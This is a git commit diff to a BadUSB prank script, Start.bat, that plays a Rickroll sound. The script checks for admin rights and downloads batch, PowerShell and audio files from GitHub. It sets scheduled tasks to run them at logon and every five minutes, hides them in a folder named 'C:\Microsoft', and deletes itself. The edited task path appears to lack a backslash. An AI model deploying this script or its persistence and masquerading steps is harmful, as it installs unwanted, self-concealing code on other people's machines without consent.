53cdec4970ecec7e16ef49131fd227ebeb58a9bd
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2023-01-23 00:16:10 +0800

    Update Start.bat

--- BadUSBScripts/RickRoll/TaskSchedularRickRoll/Start.bat
+++ BadUSBScripts/RickRoll/TaskSchedularRickRoll/Start.bat
@@ -1,12 +1,12 @@
 @echo off
 whoami /all | findstr S-1-16-12288 > nul
  if %errorlevel%==1 goto NotAdmin
-cd %appdata%
-mkdir Windows
-cd Windows
+cd C:\
+mkdir Microsoft
+cd Microsoft
 Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/RickRoll.wav -OutFile .\RickRoll.wav;Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/Sound.bat -OutFile .\Sound.bat;Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/Sound.ps1 -OutFile .\Sound.ps1
-Schtasks /create /sc ONLOGON /tn L /tr "C:%appdata%\Windows\Sound.bat" 
-Schtasks /create /sc DAILY /tn LOL /tr "C:%appdata%\Windows\Sound.bat" /ri 5 /du 24:00
+Schtasks /create /sc ONLOGON /tn L /tr "C:Microsoft\Sound.bat" 
+Schtasks /create /sc DAILY /tn LOL /tr "C:Microsoft\Sound.bat" /ri 5 /du 24:00
 cd /D "%~dp0"
 del Start.bat
 exit
